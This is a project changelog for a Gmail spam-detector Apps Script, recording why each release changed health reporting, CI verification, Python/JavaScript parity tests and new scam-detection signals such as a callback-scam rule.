# Changelog

Release history for the Apps Script source, newest first.

The source was a single `SpamDetector.gs` until the split recorded at the top of
this file; entries below that point name it, and were accurate when written.

This lived in the file's own header comment until v6.49.0, where it had grown to
459 lines — 11% of the source — and was actively misleading: three consecutive
entries described three incompatible designs for the same function, with nothing
marking which one was live. A reader could not tell the current contract from the
archaeology.

The header now carries only the current contract (purpose, execution flow, the
seven rules). Historical reasoning lives here, where being long is fine.

Each entry says *why*, not just what — these are mostly records of a specific
miss or incident and the reasoning that produced the fix. `git log` has the same
detail plus the diffs.

---

## Repository layout: SpamDetector.gs split into 21 files

**No version bump, and no behaviour change — deliberately.**

`SpamDetector.gs` had reached 5,574 lines. It is now 21 files listed in
`sources.json`: `Config.gs`, `Clickbait.gs`, `Patterns.gs`, `Inbox.gs`,
`SpamFolder.gs`, `Cleanup.gs`, `Thread.gs`, `Signals.gs`, `Verdict.gs`,
`Disposition.gs`, `Labels.gs`, `Text.gs`, `LinkGraph.gs`, `Log.gs`, `Setup.gs`,
`Domains.gs`, `State.gs`, `Maintenance.gs`, `Intelligence.gs`, `Flush.gs`,
`Debug.gs`.

Apps Script has no module system: every `.gs` is concatenated into one global
scope. So this is a file move and nothing else — every function stays a global
with the same name, and no call site changed.

**The split is byte-exact, and that is checkable.** Cutting only at top-level
declaration boundaries, never reordering, means concatenating the files in
manifest order reproduces the pre-split source exactly:

    cat Config.gs Clickbait.gs ... Debug.gs | shasum -a 256
    aaeda257da842726c21425f5bf00aa5639bc72e5d9aac0a166123fb9c5ae23d8   # identical

`concatSource()` therefore joins with `''` rather than `'\n'`, and every source
file is required to end with a newline so nothing can weld onto the next.

The version markers are untouched, so the **program** is byte-identical to what
was already live. Be precise about what that does and does not claim: the
concatenation our own readers build is provably identical, and the deployed
*artifact* goes from one remote file to 21. Apps Script's own inter-file joining
is neither controlled nor observable from here, so this is not a licence to skip
verification on a later change.

To re-check the claim at any point, from git alone — `d520898` is the last
commit that contained the file:

    git show d520898:SpamDetector.gs | shasum -a 256
    aaeda257da842726c21425f5bf00aa5639bc72e5d9aac0a166123fb9c5ae23d8

`Signals.gs` is 529 lines, the only file over 500 — of which `collectSignals()`
is a single 503-line function. Splitting that function is a code change, not a
file move, and is deliberately out of scope here.

---

## v6.62.0

**The Spam folder is now readable from outside Apps Script.**

The Spam folder was the one place this detector acts that nothing outside Apps
Script could see. The Sheet records what the detector *did* — deleted,
quarantined — so a message sitting in Spam waiting out `gmailSpamGraceDays`
appeared nowhere at all. Asking "will the script delete that one, and when?"
meant opening Gmail and reasoning about `reviewGmailSpam()` by hand.

It is not merely undocumented, it is unreachable: Gmail API clients exclude
`SPAM` from search by default, so `in:spam` returns nothing to an external
token even when the token is otherwise fine. The script itself is the only
thing that can already see the folder, so it is the thing that has to publish
it.

`writeSpamFolderSnapshot()` writes a **"Spam Folder"** tab: one row per thread
currently in the folder, with the verdict this detector will apply and the
signals behind it — `DELETE_GMAIL_SPAM_CONFIRMED`, `AWAITING_GRACE` with the
exact `DeleteDueAt`, `KEEP_WHITELISTED`, `PENDING_REVIEW`, `DELETE_AGED`,
`BLOCKED_NO_ARCHIVE`.

A **gauge, not a log**, exactly like the `Health` tab: cleared and rewritten
each cycle, because it answers "what is in the folder right now". An
append-only version would add a duplicate block per cycle for mail that has not
changed. The permanent record of what was actually deleted already lives in the
Raw Log.

**It costs no extra Gmail reads per message.** Verdicts come from
`_spamFolderVerdicts`, which `reviewGmailSpam()` Phase 1 now populates as it
goes — it has already paid for `collectSignals()` on those messages.
Recomputing them in the snapshot would have meant a second `getRawContent()`
each, which is the bill this file keeps refusing to pay. The whole function is
two bounded searches and one batched `getMessagesForThreads()`; the "Reviewed"
column comes from the second search rather than N per-thread `getLabels()`
calls for the same reason. Bounded at 100 threads, and the tab says so
explicitly when it truncates, so a partial view can never be misread as an
empty folder.

Never throws. A diagnostic tab must not be able to break the run it reports on.

---

## v6.61.0

**Backlog 1.3: signals no longer fail open, and a message that was never judged
is no longer permanently exempted.**

Two separate defects, one root cause.

**1. One throw discarded eight signals.** Signals 5 and 7 were individually
wrapped in `try/catch`; 1a, 1b, 1c, 2, 2b–2d, 3, 4, 6, 8 and 9 were not. A
single throw skipped every remaining signal and `analyzeMessage()`'s catch-all
returned `{isSpam: false}`.

All twelve are now wrapped individually — a failing signal contributes nothing
and the rest still run. Three variables genuinely crossed block boundaries
(`textToCheck`, `atIdx`, `isFreeMail`), so they are hoisted: a `const` declared
inside a `try` is invisible to the next block.

The pre-existing catches on Signals 5 and 7 now increment the skip counter too.
Leaving them uncounted meant a genuinely degraded verdict reported itself as
complete — found by a test that asserted `_degraded` and failed.

**2. The permanent exemption.** This was the more serious half. A throw made
`analyzeMessage()` return `{isSpam: false}`, indistinguishable from a real clean
verdict, and `processInbox()` then applied `SpamChecked` — which removes the
thread from the search query **for good**. Malformed MIME that makes
`getRawContent()` throw was a permanent detector exemption an attacker could
trigger deliberately.

Now `analyzeMessage()` reports `unevaluated`, and a message that was not judged
is flagged for review but **not** marked processed, so the next run tries again.
Two cases are deliberately different:

| Reason | Retried? | Why |
|---|---|---|
| `'size'` (over the 5MB cap) | No — marked processed immediately | Permanent property of the message; re-fetching forever costs quota and changes nothing |
| `'error'` (a throw) | Once | May be transient; bounded by the review label so undecodable mail cannot become an unbounded re-fetch loop — the failure mode that cost 11,500 reads/day in v6.50.1 |

A clean verdict reached with a signal missing is also reported as unevaluated.
Spam is still acted on: missing signals can only cause a **miss**, never a false
positive.

New `threadHasLabel()` is the retry counter — a label rather than a Script
Property because it is per-thread, survives executions, needs no cleanup and is
visible in Gmail. It fails **closed**: if labels cannot be read it claims
"already retried", ending the loop rather than granting one every run.

`_degraded` is meta rather than a detection signal, hence the underscore, which
the parity bridge filters — it has no Python counterpart by design. It surfaces
as `DEGRADED` in the Sheet's signals column, so a degraded verdict is visible in
the log rather than only in a transcript nobody reads.

**Detection behaviour is unchanged**, which the parity phase proves: all 81
fixtures still agree with the Python mirror on every signal and verdict across
this refactor of the most important function in the file. 14 new assertions;
158 total in the disposition suite.

---

## v6.60.3

Docs-only cleanup from a review pass. No code change.

**Half the list-management API was undocumented.** `addToWhitelist`,
`viewWhitelist` and `removeFromWhitelist` were in the README; their three
blacklist counterparts were not, despite existing and working. Added, with a
note that source-level `DEFAULT_DOMAINS` entries are merged at runtime and need
no refresh call — the thing people used to get wrong.

**`docs/BACKLOG.md` 2.2 was stale.** "Port the corpus harness to Node, delete
the Python mirror" existed because mirror drift was *silent*. v6.60.0 closed
that, so the item is downgraded from a correctness hazard to a maintenance
preference, with an explicit "do this only if" condition instead of an implied
should.

**New backlog item 2.6: `cleanseInbox()` is an undocumented destructive entry
point.** Found by auditing for functions with no call sites. It deletes Rule-1
matches across up to 500 inbox threads and is mentioned nowhere a user would
look, so the person most likely to run it is the one least likely to know what
it does. Recorded rather than acted on, because deleting it is a behaviour
change and this release is docs-only — but deleting is probably right, on the
same reasoning that removed `purgeAllSpamNow()` in v6.60.1.

---

## v6.60.2

Document the trigger interval that is actually running: **10 minutes**.

The README, the published site, the source header and the setup instructions all
said "every 1 minute". Production has been on a 10-minute interval — found by
reading the health-marker timestamps (21:28:06, 21:38:13, 21:48:06, 21:58:06),
not from anything in the code, because the trigger is created in the Apps Script
UI and nothing here could observe it.

Ten minutes is the intended cadence, so the docs move to match reality rather
than the reverse. Updated: the source header, `processInbox()`'s contract,
`setup()`'s printed instructions, the README (setup step, "Done!", the
troubleshooting check and the latency note), and `docs/index.html` (meta
description, hero, how-it-works, setup).

Two comment blocks carried arithmetic computed for a 1-minute trigger and are
now corrected rather than deleted, because the numbers are the reason the guards
exist:

- `runPeriodicMaintenance()` — the read-quota table gains the real row
  (~1,000 reads/day at 10 minutes, against ~10,000 at one minute). The
  5-minute maintenance gate now rarely binds; it is kept deliberately, because
  the interval is a UI setting that can change back without anything in this
  code noticing.
- `writeHealthRow()` — an appended row would be ~144/day at this interval
  rather than 1,440, and the staleness threshold is stated as what it actually
  is: interval plus health throttle, about 15 minutes.

No behaviour change. The latency note is now honest: spam is removed within one
trigger interval, not "near real-time".

---

## v6.60.1

Delete three functions nothing called.

`setupTrigger()`, `reviewSpamFolderNow()` and `purgeAllSpamNow()` were all
manual editor entry points, wired to nothing, and never once invoked. They were
added on my own initiative rather than asked for.

`purgeAllSpamNow()` is the one worth naming: a one-click function that
permanently deleted up to 1,000 messages, **including Gmail-classified mail this
script never evaluated**, with no preview. `docs/BACKLOG.md` 2.5 proposed adding
a `DRY_RUN` flag to make it safer. Deleting unused code that can destroy mail is
the better answer, so that item is closed as moot rather than done.

Also removed: the Tier-3 nit about it duplicating `destroySpam()`'s paging loop,
and the stale references in the README, the workflow's failure hint, and a
source comment that told the reader to run a function that no longer exists.
The trigger is once again created in the Apps Script UI, as the README
documents.

Net: 84 fewer lines of source, no behaviour change. Nothing in the detection,
disposition, logging or health paths is touched — full suite green, and
`clasp status` still pushes exactly `appsscript.json` + `SpamDetector.gs`.

---

## v6.60.0

**The Python mirror can no longer drift from the JavaScript without CI failing.**

`tests/test_spam_detector.py` hand-mirrors the detection logic in Python. Option
B keeps the pattern *constants* honest by parsing them out of `SpamDetector.gs`,
but the *logic* is written twice — so a fix applied to the `.gs` and not to the
mirror passed every test in the file. That already happened once, and was caught
only because someone happened to add a scam fixture.

The previous mitigation was hand-copied "parity tables" in this suite and in
`tests/test_link_graph.js`. Same flaw one level up: a human has to remember to
update both.

New **Phase 7** compares the implementations mechanically. Python owns the
inputs — it already parses the `.eml` files, so there is no second `.eml` parser
to drift — and pipes them to `tests/parity_signals.js`, which runs them through
the genuine `collectSignals()`, `makeVerdict()` and `getRuleFromSignals()`.
Python then asserts both sides agree signal-by-signal, and on the verdict, for
every fixture.

Two guards, both verified by deliberately introducing the fault:

| Fault injected | Result |
|---|---|
| Flipped `callback_phishing` in the Python mirror | ❌ exit 1, naming the fixture, the signal, and both values |
| Added an unmirrored `someNewSignal` to the `.gs` | ❌ exit 1, naming the missing Python key |

Current state: **81 fixtures agree on all 11 signals and the verdict.**

It extends itself, which is the point — every new `.eml` becomes a parity case
and every new signal is compared automatically, so this does not decay the way
the hand-maintained tables did.

One bug caught while wiring it: the failure was assigned to `all_passed`, a name
that does not exist in `main()` (the real variable is `all_good`), so a parity
failure would have printed and still exited 0. Verified by injection rather than
by reading, which is the only reason it was found.

---

## v6.59.2

Remove the scheduled health workflow. It was not asked for.

The request was to run `prod_health.py` in CI on deploy. v6.59.0 delivered that
as `verify-prod` and also added `.github/workflows/health.yml` on a 30-minute
cron, on my own initiative — roughly 48 extra CI runs a day, and a second place
to keep in sync, for a requirement nobody stated.

The reasoning behind it was not wrong: a deploy-time check cannot see a trigger
that dies at 3am. But that is an argument for proposing the idea, not for
shipping it unasked. Scope belongs to whoever is asking.

`verify-prod` stays exactly as it is, including the 15-minute poll window sized
for the observed 10-minute trigger interval. If the standing check is wanted
later, this entry is the record of what it was and why it existed.

---

## v6.59.1

**The new CI job failed on its first run, and it was right to.**

`verify-prod` polled for 6 minutes and never saw the new version. The marker
timestamps explain why: 21:28:06, 21:38:13, 21:48:06, 21:58:06 — **exactly ten
minutes apart**, with a five-minute health throttle. The live trigger is on a
**10-minute interval**, not the 1-minute one the README documents and v6.40.0's
performance work was tuned for.

Nothing in the codebase could have detected this, because nothing in the
codebase created the trigger — it was made by hand in the Apps Script UI, where
"every 10 minutes" is one dropdown entry away from "every 1 minute". The health
marker is what made it visible at all.

A 10-minute interval is not broken, but it is not what is documented, and it
means up to 10 minutes of spam sitting in the inbox instead of one.

- New **`setupTrigger()`** makes the interval a property of the source rather
  than a dropdown someone picked once. Idempotent — it removes existing
  `processInbox` triggers first, since each duplicate would be a full extra
  execution against the same quota. Run it from the editor.
- `verify-prod` now polls 20 × 45s (15 min), because the budget has to cover
  the trigger interval plus margin.
- The scheduled check allows a 25-minute marker age: trigger interval (10) +
  health throttle (5) + margin. A healthy marker can legitimately be 15 minutes
  old, and a check that false-alarms is a check that gets muted.

---

## v6.59.0

**Prod health is now checked by CI — on every deploy, and every 30 minutes.**

Two jobs, because they catch different failures:

- **`verify-prod`** (deploy pipeline, after `validate`). `validate` proves the
  new source is *live*; it does not prove the script still *runs*. A deploy can
  leave syntactically valid code that throws on every trigger, and nothing
  downstream would notice — a broken detector writes no Sheet rows, which is
  indistinguishable from a quiet mailbox. It cannot prevent a bad deploy, since
  the push already happened; it is detection tied to the change that caused it.
  Runs in parallel with `tag`, because tagging is bookkeeping and should not be
  blocked by a runtime problem.
- **`.github/workflows/health.yml`** (cron, every 30 min). Most ways this
  detector dies have nothing to do with a deploy: the trigger stops firing, the
  daily Gmail quota is exhausted, the OAuth grant is revoked, a permission
  changes. **The failure that motivated all of this was exactly that shape** —
  six obvious spam messages sat in the folder across two releases, nothing was
  broken at deploy time, and nothing told anyone afterwards. A deploy-time-only
  check would have missed it entirely.

**A version change now bypasses the health throttle.** Without this the
5-minute quiet-run interval held the *previous* version's health signal after a
deploy, so `verify-prod` would read the old version and fail on staleness rather
than on a defect. A flaky check is one that gets ignored. The first run on new
code is also the run most worth reporting, so it writes immediately and
`LAST_HEALTH_VERSION` makes it fire exactly once.

`verify-prod` still polls (8 × 45s) because the marker only updates when the
trigger next fires, and the scheduled job allows a 12-minute marker age, which
tolerates a couple of missed executions plus the throttle.

`prod_health.py`'s credential parsing now matches the deploy workflow's
tolerance — clasp@3.x `tokens.default`, older `token`, flat, and
`oauth2ClientSettings` nesting. CI runs it against the `CLASP_TOKEN` secret
rather than a local login, and those do not agree.

Three new assertions cover the version-change bypass, that it fires only once,
and that ordinary quiet runs stay throttled.

---

## v6.58.3

**The health check no longer needs a hand-crafted OAuth token.**

v6.58.0 put health in a `Health` tab and `scripts/prod_health.py` read it via
the Sheets API — which required minting an access token and passing it in
`GOOGLE_OAUTH_ACCESS_TOKEN`. Requiring a human to hand-craft a token before they
can ask "is it running?" is not a health check. The Sheets API is not even
enabled for clasp's OAuth client, so the credentials already on the machine
could never have worked.

Producing the signal was never the hard part; reading it was. Every channel
Apps Script offers is closed to the credentials that exist:

| Channel | Why it cannot be read |
|---|---|
| `Logger.log` (transcript) | Apps Script API needs the `script.processes` scope → 403 |
| `console.*` (Cloud Logging) | goes to the script's *default* GCP project; the one in `.clasp.json` has never received an entry |
| `Health` tab (Sheets API) | not enabled for clasp's OAuth client; needs a separate token |

Drive **metadata**, though, is readable with exactly what `clasp login` writes to
`~/.clasprc.json` — and a file name is metadata. So `updateHealthMarker()` keeps
one marker file and renames it each run:

```
SpamDetector_health_OK_v6.58.3_2026-09-17T21:38:13.367Z
```

One file, renamed in place, id kept in Script Properties so copies never
accumulate; content stays empty. `prod_health.py` now takes no arguments and no
token — it refreshes the clasp credential itself, reads the name, and checks
liveness, deployed version and status.

The marker is also written **before** the Sheet, and independent of it. It was
behind the `SPAM_LOG_SHEET_ID` guard, so a missing or broken spreadsheet took
the machine-readable signal down with it — exactly backwards, since a
misconfigured Sheet is when you most need to be told.

The `Health` tab stays as the human-readable surface. Eight new assertions cover
marker creation, the name format, rename-not-recreate, recreation after
deletion, `THREW` appearing in the name, and an unwritable Drive not breaking
the run.

---

## v6.58.2

Header and gauge are now written together, in one call.

v6.58.0 wrote the Health header only when creating the tab. v6.58.1 then added
a `LastError` column, so an already-created tab kept its 7-column header while
row 2 received 8 values — `LastError` sat in an unlabelled column H. Verified
in prod: the live tab showed exactly that.

Writing both rows every time costs the same single `setValues` call and makes
the tab self-healing the next time this schema changes.

Also corrects the record from v6.58.1: the Health tab **was** being written by
v6.58.0. It first appeared at 21:28 UTC with status OK, after the reads that had
reported it missing — those were simply too early. v6.58.1's `finally`
placement remains correct and necessary on its own merits (a run that throws
must still report), but it was not fixing a write that had failed.

---

## v6.58.1

**The heartbeat could not report the failure it existed to report.**

v6.58.0 put `logRunHeartbeat()` at the end of `processInbox()`'s `try`. So it
only ran when the run *succeeded*. A run that threw wrote no health row at all —
indistinguishable from a trigger that never fired, which is exactly the blind
spot the heartbeat was added to close. The same bug one level down: the failure
mode a health signal most needs to report is the one that skips the signal.

Found while verifying v6.58.0 in production: no Health tab appeared after
several trigger cycles, and with the heartbeat inside the `try` there was no way
to tell "not running" from "throwing every run".

- The heartbeat now lives in `finally`, so it reports on success, on throw, and
  on the Gmail-quota `return` inside the `catch` (which also jumps to `finally`).
- Counters and `auditFindings` moved to function scope, since `finally` reads them.
- New `THREW` status, which outranks every other — a run that did not complete
  has partial counters and must not read as clean.
- New `LastError` column carries the exception text, escaped and truncated.
- A thrown run bypasses the quiet-run throttle.
- It runs before `releaseLock()`, so the write completes while this execution
  still holds the lock and cannot interleave with the next trigger's row.

Four new assertions cover the THREW status, the recorded error text, THREW
outranking clean counters, and bypassing the throttle.

---

## v6.58.0

**v6.57.0's heartbeat went somewhere unreadable. This puts it where it can be read.**

I shipped console.error/console.log as the queryable prod signal and then
checked: Cloud Logging returned **zero entries**. Apps Script routes console.*
to the GCP project attached to the script, and this script uses the auto-created
default project — the project named in `.clasp.json` has never received a single
log entry. Attaching a standard GCP project is a manual console procedure with
an OAuth consent screen, not something a deploy can do.

So the v6.57.0 claim was wrong in the way that matters: the signal existed and
nothing could read it. Same category as the bug it was meant to catch.

`writeHealthRow()` writes to a **Health** tab in the log spreadsheet already in
use — configured, already written to, readable with credentials that exist.

- **One row, overwritten.** A gauge, not a log. At one run per minute an
  appended row would add 1,440 rows a day to a spreadsheet whose whole purpose
  is the detection log. **Staleness is the signal**: if `LastRunAt` is older
  than a few minutes, the detector is not running.
- **Columns:** `LastRunAt, Version, Status, Processed, SpamActioned, RunErrors,
  AuditFindings`. `Status` is `OK`, `ERRORS`, or `AUDIT_FINDINGS`.
- **Throttled.** A quiet run rewrites at most every 5 minutes, so the common
  case costs no Sheets call. Anything eventful — work done, an error, an audit
  finding — writes immediately and bypasses the throttle.
- Wrapped so an unwritable Sheet cannot break the run it reports on.

`scripts/prod_health.py` reads it back and exits non-zero on a stale run, a
version mismatch, or a non-OK status, so cron or CI can gate on it. The Health
tab is also two columns of plain text, so it answers the question by eye.

`console.error` from v6.57.0 is retained — harmless, and correct the day a
standard GCP project does get attached.

Seven new assertions cover tab creation, the gauge row, status mapping, the
throttle, findings bypassing it, and an unwritable Sheet not throwing.

---

## v6.57.0

**Prod health is now answerable from outside Apps Script.**

v6.56.0 added a self-audit, and verifying it exposed a worse gap: there was no
way to ask "did the last run succeed?" at all.

`logInfo`/`logError` wrote only via `Logger.log`, which lands in the Apps Script
execution transcript. That transcript is not merely the place nobody reads — it
is unreachable by anything holding this project's credentials. The Apps Script
API needs the `script.processes` scope, which the deploy credential does not
have (confirmed: 403 `ACCESS_TOKEN_SCOPE_INSUFFICIENT`), and a Cloud Logging
query over the attached GCP project returned **zero** entries because
`Logger.log` does not go there.

The practical consequence: **a clean run and a script that crashed on its first
line look identical from outside.** Both write no Sheet rows and no readable
log. The v6.56.0 audit could not have reported a crash that prevented it from
running, and "no audit rows" was being read as health when it is equally
consistent with total failure.

Two changes:

- `logError` now also calls `console.error`, which does reach Cloud Logging,
  where it is queryable and alertable. Errors only — routing every `logInfo`
  there would bury them under a per-minute trigger's routine chatter.
- New `logRunHeartbeat()` emits exactly one line per execution:
  `RUN v6.57.0 processed=N spam=N errors=N audit=clean|FINDINGS:N`. Emitted
  unconditionally, **including on empty-inbox runs**, because that is precisely
  what separates "nothing to do" from "never ran". One line per minute is
  trivial for Cloud Logging and cheap to query.

Both are wrapped so a missing or throwing `console` cannot break the run, and
`Logger.log` is retained alongside, so nothing is lost from the transcript.

Six new assertions cover error routing, the heartbeat's contents including the
running version and audit findings, and that a broken console does not throw.

---

## v6.56.0

**Production now tells on itself.**

Every disposition bug this project has shipped was invisible in production. The
code believed it had acted, nothing disagreed out loud, and the only way to find
out was for a human to open the Spam folder or read the Sheet and notice. Six
messages sat through two releases meant to remove them. A whitelisted keep was
filed as a detection failure. Every test was green throughout, because the tests
prove what the new code does — they never ask whether prod agrees.

`auditRunIntegrity()` runs at the end of every `processInbox()` and checks two
invariants. It costs **zero** Gmail API calls: it reads only tallies already
accumulated during the run.

1. **Log parity.** Every permanently deleted message has a Sheet row. Deletion
   is irreversible, so an unlogged delete destroys the only record that it ever
   happened — and "all spam must be logged" is a standing requirement, not a
   nicety. Violated whenever a delete path skips `accumulateLogEntry()`.

2. **Spam actioned.** Phase 2 left no aged, non-whitelisted mail behind. This is
   the "is the detector acting on the Spam folder at all?" check — the invariant
   whose violation went unnoticed for two releases. Mail phase 2 deliberately
   spares (whitelisted) is not a violation; mail it silently failed to resolve
   is.

Findings go to the **Sheet**, not only `logError`. A lesson already recorded
here is that `logError` reaches only the Apps Script transcript, which nobody
reads — so a silent failure stayed silent. The Sheet is the surface actually
looked at, so that is where a broken invariant belongs, as an `AUDIT_LOG_GAP` or
`AUDIT_SPAM_NOT_ACTIONED` row.

The audit is deliberately non-throwing and silent on healthy runs. An audit that
breaks the run it audits is worse than the bug it reports, and one that cries
wolf is one you learn to ignore.

Nine new assertions in `tests/test_disposition.js` cover both findings, the
healthy path, an idle run, deliberately spared whitelisted mail, and that a
failing audit cannot throw into the run.

---

## v6.55.1

Two nits from a review of v6.55.0, one of them live.

**`getRuleFromSignals(null)` described every null-signal disposition as a
"false negative".** That string lands in the Sheet's rule-description column, so
mail the detector had judged correctly *on purpose* was filed as a detection
failure. It is what made the whitelisted LinkedIn row read
"False negative — no rule triggered" for an invitation from an actual colleague.

Removing the whitelisted row in v6.55.0 hid one instance and left the cause: two
live callers still pass null — `GMAIL_SPAM_EXPIRED` (aged out on Gmail's verdict)
and `SPAM_MISSED_REFUSED_WHITELISTED` (a refusal) — and both are deliberate
dispositions. A real false negative is re-scored before logging, so it carries
signals and never reaches that branch; the label was wrong for 100% of actual
null cases. Now "Not rule-based — see log type", with an assertion.

**The published site was stale by two releases.** `docs/index.html` advertised
"Seven rules" and "Nine independent signals" with no Rule 8 and no Rule 9. Added
both rule rows and signal cards for the free-mail sender shape and callback-scam
anatomy. Counted prose that a new rule silently falsifies is now uncounted, so
the next release cannot make the page wrong by omission.

---

## v6.55.0

Two bugs the user found by reading the Sheet, both mine.

**1. LinkedIn invitations appeared as rows in the spam log.**

`reviewGmailSpam()` phase 1 wrote a `GMAIL_SPAM_KEPT_WHITELISTED` row for mail
it deliberately left alone. In a sheet whose other rows are all deletions, that
reads as "LinkedIn was flagged as spam" — the opposite of what happened.

It also duplicated without bound, and v6.54.0 is what made it do so. Whitelisted
mail is never deleted, so it stays in the Spam folder permanently; the new forced
re-review re-judges the whole folder on every version change. One fresh pair of
rows per deploy, for the same two invitations, forever. The same shape as the
quota leaks in v6.50.1 and v6.49.1: a per-deploy cost I introduced while fixing
something else.

Phase 2 already had this right — it counts spared whitelisted mail and writes no
row. Phase 1 now matches it. The `logInfo` line remains, which is where a
non-action belongs. The Sheet records what the detector DID.

**2. A Norton callback scam was classified as generic spam, and nothing in the
inbox path would have caught it at all.**

`raju47326yu@gmail.com` reached the Spam folder and was removed only because
Gmail had already judged it and Signal 8 corroborated. On its own merits the
detector scored it at zero:

- No links anywhere, so Signal 7 had nothing to compare.
- Direct-send through `smtp.gmail.com`, so Rules 1-3 had no bulk prerequisite.
- Subject "It has been updated to Invoice 73125625." — a flat statement, so no
  clickbait or fear pattern fired.
- Valid SPF, DKIM and DMARC, because gmail.com really did send it.

It was a fake Norton renewal: From display name set to the recipient's own name,
a plausible invoice ($145.91, a product key, a payment ID), and a support number
to call. **The scam works precisely because it has no link to inspect** — the
victim is moved to a phone call, where no email filter follows. Signals built to
read link graphs and marketing vocabulary cannot see it.

New **Signal 9 / Rule 9** detects the anatomy instead of the wording. All four
must hold: a free-mail sender, a named brand it provably isn't, billing
language, and a phone number. A four-way conjunction because no single part is
rare — real people invoice from Gmail, and real invoices carry phone numbers. It
is the combination with an impersonated brand that has no innocent reading.

Rule 9 **quarantines rather than deletes** (absent from `DESTRUCTIVE_RULES`,
which is an allowlist, so this is the default it falls into). The residual
false-positive class is someone forwarding a genuine receipt and adding a
callback number — unlikely, not absurd — and a fuzzy signal gets a recoverable
disposition. In the Spam folder it still deletes, because it counts toward
`hasCorroboratingSignal()` where Gmail has already judged the message. Logged as
`PHISHING_DETECTED`, not `SPAM_DETECTED`.

**Tests.** The real message is now `tests/scam_examples/Norton renewal callback
scam from freemail.eml` (scam corpus 4 → 5). 15 new Node assertions drive the
shipped `collectSignals()` with its verbatim content and assert the quarantine
routing; five of them remove one condition each, so every condition is proven
load-bearing rather than decorative.

Signal 9 is also mirrored in the Python harness, so the 22-file ham corpus
actually exercises it — without the mirror the new signal would have had no
false-positive coverage at all, which is the drift liability documented in
`docs/BACKLOG.md`. Supporting parser change: `_load_string_array` grew an
`allow_spaces` flag for phrase arrays like `'geek squad'`, relaxing only the
space rule while still failing on the newline and comma that actually indicate a
desynchronized parse.

`scripts/validate.py` now checks the README scam count too. It was unvalidated,
and it drifted from 4 to 5 in this very release with nothing to catch it.

---

## v6.54.0

**A fix that could not see the mail it was written for.**

Six obviously-bad messages sat in the Spam folder across two releases that were
supposed to remove them. v6.52.0 added Signal 8 (machine-generated free-mail
local part) specifically to catch `raju47326yu@gmail.com`, shipped green, and
changed nothing about the folder.

The cause was a label, not a rule. v6.50.1 started stamping left-alone
Spam-folder mail with `processedLabel` to stop a re-fetch loop that was costing
11,500 reads/day. Correct on its own. But phase 1's query excludes
`-label:SpamChecked`, so once a message has been judged by *any* version it is
permanently invisible to every later version. Those six were reviewed and marked
by the old agree-then-delete logic, which found no agreement. Signal 8 never got
a look at them.

That is the same class of bug as the one at the top of `docs/BACKLOG.md`: the
instance was fixed and the class was not. "Reviewed" was recorded as a permanent
fact about the message when it is really a fact about *the logic that reviewed
it* — so improving the logic has to invalidate it.

`reviewGmailSpam(forceFullReview)` now drops that exclusion when
`SCRIPT_VERSION` changes, reusing the version-change mechanism
`recheckRecentSpamChecked()` already applies to the inbox: when detection logic
changes, re-examine what you previously decided. One bounded pass per deploy
(`REVIEW_LIMIT` 20), not a standing loop, so the quota leak v6.50.1 closed stays
closed.

A forced pass widens only *which* messages are judged, never what a verdict
means — whitelisted senders are still kept, uncorroborated mail still waits out
the grace period, and deletion is still gated on a successful archive. Five new
assertions in `tests/test_disposition.js` cover both query shapes, the delete of
previously-dismissed spam, and whitelist survival under a forced pass.

Also adds `reviewSpamFolderNow()` — the same pass on demand from the editor, for
acting on the folder without waiting for a version bump or the next cycle.

---

## v6.53.0

`checkFalseNegatives()` refuses to delete whitelisted mail, and two bugs found
while fixing it.

**The hazard.** This path deletes everything carrying the user-applied
`SpamMissed` label with no whitelist check. That is sound for one deliberate
click and unsound for a mis-click: labelling forty threads in Gmail is two
keystrokes, and every one of them was permanently deleted. Found while
investigating a suspicion that the detector was eating LinkedIn mail — it was
not, but driving the real code with a stubbed runtime surfaced this. Confirmed
against `git show HEAD:SpamDetector.gs`: the old code issued
`batchDelete(["mSM_WL"])` on a whitelisted LinkedIn message and logged it
`FALSE_NEGATIVE`. Four of the new assertions fail on the previous commit, so
they are regression tests rather than mirrors of the implementation.

A whitelisted sender is the user's own standing instruction that the mail is
wanted. Two instructions conflict, so the non-destructive one wins: log it,
swap the label, say why, touch nothing.

**Checked across the whole thread, not just `messages[0]`.** `markAsSpam()`'s
fallback when the Advanced Gmail Service is unavailable is
`thread.moveToSpam()`, which moves every message — so a whitelisted sibling in
a reply chain would be dragged along. `getFrom()` is free metadata, so scanning
the thread costs nothing.

**Bug 1, found while reading: the label was removed before the archive check**,
so the `if (!archived)` branch dropped the message silently and its comment
promising a retry next run was false — nothing carried the label any more.

**Bug 2, introduced by fixing bug 1 and caught in review: keeping the label
retried forever.** `accumulateLogEntry()` buffers its Sheets row *before* the
archive check, so each retry wrote a duplicate row and paid two
`getRawContent()` fetches. Measured at 288 rows and 576 reads per day for a
single stuck message, with no convergence.

Both branches now call `swapSpamMissedForReview()`: remove `SpamMissed`, add
`CONFIG.reviewLabel`, log the reason. Swapping beats both alternatives.
*Cleared* was invisible — from Gmail the sequence read "apply the label, nothing
happens, the label vanishes", indistinguishable from a broken feature, and
`logError` only reaches the execution transcript. *Kept* was the unbounded
retry. Swapping gives exactly one row, one log line, and an outcome the user can
see where they made the request. Measured after the fix: 1 row across 5 cycles
and zero fetches after the first.

Test harness: `fakeThread()` now takes an optional shared sink so label
operations interleave with Gmail operations in one ordered log. Without it the
invariant "remove the label before deleting, because a deleted thread cannot be
relabelled" was unprovable — the two op kinds lived in separate arrays, and an
earlier assertion comparing them passed vacuously at `-1 < 0`. Also removed a
duplicated assertion and rewrote one written in the vacuous `every(...)` shape
that passes when the row is absent.

Disposition assertions 68 -> 84, including the three edge cases review asked
for: a whitelisted sibling vetoing the delete, an unreadable `From` failing safe
to refusal, and whitelisted-and-unarchivable where the guard must win and the
outcome must still be visible.

## v6.52.0

Catch the spam our rules previously could not, in the Spam folder and in the
inbox.

`raju47326yu@gmail.com` survived because no rule fired on it: not bulk-routed,
so Rules 1-3 were unreachable, and `gmail.com` obviously cannot be blacklisted.
Waiting seven days for the age gate was the only disposition available, which is
not good enough for mail that is plainly spam.

**Signal 8 — free-mail sender with a machine-generated local part.** Two narrow
shapes: letters then 3+ digits then MORE letters (`raju47326yu`, `amit83920xk`),
or 5+ consecutive digits (`pooja1029384`). The trailing-letters requirement is
what makes it safe — `john1985` and `clark.kent1938` are how humans write a
birth year and do not match. Measured against 42 realistic personal and service
addresses (`jane.doe`, `mike_92`, `tom99`, `jd1990`, `no-reply`,
`jobalerts-noreply`, `dse_NA3`) with **zero** matches, and 6/6 on spam-shaped
ones. Fires on **0 of 22** ham examples, and cannot fire at all for a sender on
their own domain.

